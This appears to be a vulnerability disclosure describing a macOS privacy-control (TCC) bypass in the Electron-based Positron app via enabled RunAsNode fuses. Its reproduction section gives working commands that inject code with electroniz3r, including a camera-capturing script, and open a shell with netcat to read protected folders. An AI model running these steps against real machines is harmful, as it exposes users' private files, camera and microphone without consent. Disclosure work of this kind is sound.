# TCC Bypass via Misconfigured Nodes

## Summary

A misconfigured Electron application (`Positron.app`) allows local attackers to inherit its macOS TCC (Transparency, Consent, and Control) permissions, such as access to `~/Documents` or `~/Downloads`. This is caused by insecure Electron fuse settings, particularly the `RunAsNode` fuse being enabled. Using tools like [electroniz3r](https://github.com/r3ggi/electroniz3r), an attacker can inject code and spawn a reverse shell with the same privileges as the app, bypassing standard macOS privacy controls.

This vulnerability stems from insecure default fuse settings in Electron, when not properly configured by the application developer. 

## Technical Details

To check the current fuse configuration of the app, run:
```sh
swayzgl1tzyyy@SwayZGl1tZyyys-Mac ~ % npx @electron/fuses read --app /Applications/Positron.app/Contents/MacOS/Electron 

Analyzing app: Electron
Fuse Version: v1
  RunAsNode is Enabled
  EnableCookieEncryption is Disabled
  EnableNodeOptionsEnvironmentVariable is Enabled
  EnableNodeCliInspectArguments is Enabled
  EnableEmbeddedAsarIntegrityValidation is Disabled
  OnlyLoadAppFromAsar is Disabled
  LoadBrowserProcessSpecificV8Snapshot is Disabled
  GrantFileProtocolExtraPrivileges is Enabled
```

With this configuration, the app is:
- fully injectable,
- remotely debuggable, 
- easily hijacked.

Even from another process like **Terminal**, as long as that process has **Disk Access** permissions.

## Impact

TCC permissions can be inherited, this can lead to:

1. unauthorized file access to `tcc protected contents`, for example of `~/Documents`, `~/Downloads` etc. 
2. Sensitive hardware access (e.g., `microphone`, `camera`) can also be inherited, allowing attackers to activate and use these devices without user consent. 

#### Reproduction

>Note: when attempting to reproduce the vulnerability, make sure that Terminal does not have Full Disk Access in macOS settings. This ensures that access to TCC-protected folders like Documents or Downloads is correctly restricted, and helps demonstrate the actual bypass

Attack scenario: 

1. The victim grants `Positron.app` access to a TCC-protected folder like `~/Documents`.

The victim creates a workflow in `~/Downloads`. At this point, Positron has privileged access.

<img width="2926" height="1878" alt="positron1" src="https://github.com/user-attachments/assets/12e93e06-e727-4e8e-b4b9-d97fed80f35a" />

Due to insecure Electron fuse settings, an attacker can **inherit the app's TCC permissions**.

Use [electroniz3r](https://github.com/r3ggi/electroniz3r) to inject code:
```sh
electroniz3r inject /Applications/Positron.app/ --predefined-script takeSelfie
```

This launches a shell using the **Positron app's permissions**.

Open a connection to the injected process:
```
nc 127.0.0.1 12345
```

You're now in a reverse shell with the same rights as the app.

The reverse shell allows execution of arbitrary shell commands with the same privileges as the app. To demonstrate this proof-of-concept, we'll try to list the `~/Documents` folder (as in the previous commands, listing the folder results in a error message: "Operation not permitted", even as root user). 

>Try listing the `~/Documents` folder — something normally blocked by TCC, even for root:
>`ls -la ~/Documents` In a properly secured system, you'd get: `Operation not permitted`

But with this vulnerability, the contents of `~/Documents` are exposed.

<img width="3380" height="2072" alt="tccbypass positron" src="https://github.com/user-attachments/assets/df9b430c-eea8-4345-a8f8-19db04d397d8" />



#### Credits

Discovered by:
Kun Peeks (@SwayZGl1tZyyy)

Date discovered:
4 august 2025
Affected version:
https://cdn.posit.co/positron/releases/mac/x64/Positron-2025.07.0-204-x64.dmg (macOS)



